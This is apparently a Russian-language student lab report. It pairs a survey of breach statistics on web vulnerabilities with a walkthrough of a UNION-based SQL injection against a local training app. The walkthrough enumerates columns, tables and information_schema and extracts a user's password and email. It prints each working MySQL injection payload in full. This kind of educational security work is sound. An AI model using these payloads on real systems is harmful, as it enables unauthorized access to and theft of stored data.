# Лабораторная работа №1

## Часть 1. Анализ статистики атак через веб-уязвимости

В первой части я посмотрел несколько отчётов по информационной безопасности и сравнил, какую роль в реальных атаках играют веб-уязвимости. Сразу заметно, что цифры в разных источниках отличаются, потому что отчёты считают разные вещи: где-то берутся подтверждённые утечки данных, где-то расследования инцидентов, где-то результаты пентестов или статистика WAF/API-защиты. Поэтому я не стал сводить всё к одному точному проценту, а рассмотрел общий диапазон и основные тенденции.

### Доля атак через эксплуатацию уязвимостей

По данным Verizon DBIR, эксплуатация уязвимостей остаётся одним из заметных способов начального доступа. В отчётах Verizon за разные годы доля exploitation of vulnerabilities находится примерно в диапазоне 14–20% среди подтверждённых инцидентов/утечек. При этом внутри таких случаев значительная часть связана именно с веб-приложениями и публично доступными сервисами.

В отчётах Mandiant и Microsoft также видно, что атаки через публичные приложения и не обновлённые веб-ресурсы остаются важным начальным вектором. Например, в M-Trends 2025 эксплуатация уязвимости указывается как один из самых частых initial access-векторов, а exploit public-facing application отдельно выделяется среди техник начального доступа.

Отдельно можно выделить данные Kaspersky и Positive Technologies. В расследованиях инцидентов доля веб-вектора обычно выше, чем в общих breach-отчётах. Это логично, потому что при расследованиях чаще рассматриваются реальные проникновения в инфраструктуру, где публичный периметр компании становится одной из первых целей атакующего.

Если обобщить, получается примерно такая картина:

- в крупных breach-отчётах эксплуатация уязвимостей обычно находится примерно на уровне 14–23%;
- в incident response и расследованиях доля веб-приложений как начального вектора может быть выше — примерно от 18% до 44%;
- фишинг и украденные учётные данные всё ещё встречаются очень часто, но эксплуатация уязвимостей опасна тем, что часто сразу даёт технический доступ к системе.

### Какие веб-уязвимости встречаются чаще всего

По конкретным типам уязвимостей картина тоже зависит от источника. В отчётах, основанных на WAF/API-трафике, чаще показываются попытки атак. В пентестах — реальные найденные слабые места. Но общий набор проблем повторяется:

- SQL Injection;
- Cross-Site Scripting, включая stored и reflected XSS;
- ошибки контроля доступа;
- authentication bypass;
- command injection;
- path traversal;
- небезопасная загрузка файлов;
- раскрытие конфигурационной или отладочной информации;
- старые и не обновлённые компоненты.

Например, в статистике по web application & API уязвимостям SQL-инъекции часто оказываются среди самых опасных категорий. В одном из отчётов SQL Injection занимает первое место среди критичных и высоких уязвимостей веб-приложений/API. Также заметную долю занимают malicious file upload, stored/reflected XSS и доступ к API без аутентификации.

По результатам пентестов Positive Technologies также видно, что веб-приложения на внешнем периметре часто содержат уязвимости высокого или критического уровня. Особенно опасны инъекции, потому что через них можно не просто вызвать ошибку, а получить данные из базы или повлиять на работу приложения.

### Вывод по первой части

После сравнения отчётов можно сделать вывод, что веб-уязвимости остаются одним из основных путей начального проникновения. Точные проценты отличаются от источника к источнику, но тенденция одна: публичные веб-приложения и API постоянно атакуются, а ошибки вроде SQL-инъекций, XSS, неправильной авторизации и небезопасной загрузки файлов всё ещё встречаются достаточно часто. Поэтому защита веб-приложений, регулярное обновление компонентов и корректная обработка пользовательского ввода остаются критически важными.

## Часть 2. Практическая эксплуатация SQL Injection на учебном стенде

Во второй части я работал с учебным веб-приложением на `localhost:8080`. Цель была проверить параметр `id`, найти SQL-инъекцию и получить нужные данные из базы.

### Запуск стенда

Сначала я поднял стенд командой:

```bash
docker-compose up -d
```

После запуска открыл страницу:

```text
http://localhost:8080
```

Затем установил/сбросил базу данных и перешёл к заданию.

### Проверка обычного параметра id

Сначала я посмотрел, что возвращает приложение при обычном запросе:

```text
http://localhost:8080/task/?id=1
```

Ответ был примерно такой:

```text
Ваш id: 1
Ваш логин: admin
```

Дальше я перебрал несколько значений `id`, чтобы понять, какие пользователи есть в базе. В итоге получилось, что пользователей 9:

```text
1 — admin
2 — volk
3 — matroskin
4 — vinni-pukh
5 — neznaika
6 — kotenok
7 — karlson
8 — kesha
9 — volk2
```

Из этого сразу стало понятно, что пользователь `vinni-pukh` имеет `id=4`, а `volk2` — `id=9`.

### Проверка SQL-инъекции

После этого я добавил кавычку к параметру `id`:

```text
http://localhost:8080/task/?id=1'
```

Приложение вернуло ошибку SQL:

```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
```

Это означает, что значение параметра попадает в SQL-запрос без нормальной фильтрации. Также по тексту ошибки видно, что используется MySQL.

### Определение количества колонок

Для `UNION SELECT` нужно было понять, сколько колонок возвращает исходный запрос. Я проверял это через `ORDER BY`:

```text
http://localhost:8080/task/?id=1' ORDER BY 1--+
http://localhost:8080/task/?id=1' ORDER BY 2--+
http://localhost:8080/task/?id=1' ORDER BY 3--+
http://localhost:8080/task/?id=1' ORDER BY 4--+
```

На `ORDER BY 4` появилась ошибка:

```text
Unknown column '4' in 'order clause'
```

Значит, в исходном запросе всего 3 колонки.

После этого я проверил, какие из колонок выводятся на страницу:

```text
http://localhost:8080/task/?id=-1' UNION SELECT 1,2,3--+
```

На странице отобразились значения из первой и второй колонок:

```text
Ваш id: 1
Ваш логин: 2
```

Значит, во второй колонке удобно выводить нужные данные из базы.

### Получение имени базы данных

Сначала я решил узнать имя текущей базы:

```text
http://localhost:8080/task/?id=-1' UNION SELECT 1,database(),3--+
```

Результат:

```text
Ваш id: 1
Ваш логин: security
```

Имя базы данных — `security`.

### Получение списка таблиц

Дальше я обратился к `information_schema.tables`, чтобы узнать таблицы в текущей базе:

```text
http://localhost:8080/task/?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+
```

Результат:

```text
Ваш id: 1
Ваш логин: emails,users
```

В базе есть две основные таблицы: `emails` и `users`.

### Получение колонок таблицы users

После этого я посмотрел колонки таблицы `users`:

```text
http://localhost:8080/task/?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--+
```

Результат:

```text
Ваш id: 1
Ваш логин: id,username,password
```

Значит, в таблице `users` хранятся идентификатор, логин и пароль.

### Получение колонок таблицы emails

Аналогично я проверил таблицу `emails`:

```text
http://localhost:8080/task/?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='emails'--+
```

Результат:

```text
Ваш id: 1
Ваш логин: id,email_id
```

В этой таблице есть `id` и `email_id`.

### Получение пароля пользователя Volk2

Так как раньше я нашёл, что `Volk2` имеет `id=9`, можно было сразу получить его пароль:

```text
http://localhost:8080/task/?id=-1' UNION SELECT 1,password,3 FROM users WHERE id=9--+
```

Результат:

```text
Ваш id: 1
Ваш логин: Wa spoiuuuuu
```

Пароль пользователя `Volk2`:

```text
Wa spoiuuuuu
```

### Получение почты пользователя Vinni-pukh

Пользователь `Vinni-pukh` имеет `id=4`, поэтому я сделал запрос к таблице `emails`:

```text
http://localhost:8080/task/?id=-1' UNION SELECT 1,email_id,3 FROM emails WHERE id=4--+
```

Результат:

```text
Ваш id: 1
Ваш логин: honey_lover@otus-lab.com
```

Почта пользователя `Vinni-pukh`:

```text
honey_lover@otus-lab.com
```

1. Почта пользователя `Vinni-pukh`:

```text
honey_lover@otus-lab.com
```

2. Пароль пользователя `Volk2`:

```text
Wa spoiuuuuu
```

## Общий вывод

В первой части я сравнил несколько отчётов и увидел, что веб-уязвимости до сих пор являются одним из важных способов начального доступа в инфраструктуру. Особенно часто проблемы возникают в публичных веб-приложениях и API. На практике это подтверждается тем, что даже простая SQL-инъекция может позволить получить структуру базы данных и вытащить из неё нужные значения.

Во второй части на учебном стенде я сначала проверил обычные значения `id`, затем обнаружил SQL-ошибку через кавычку, подобрал количество колонок для `UNION SELECT`, получил список таблиц и колонок через `information_schema`, а после этого достал пароль пользователя `Volk2` и почту пользователя `Vinni-pukh`.
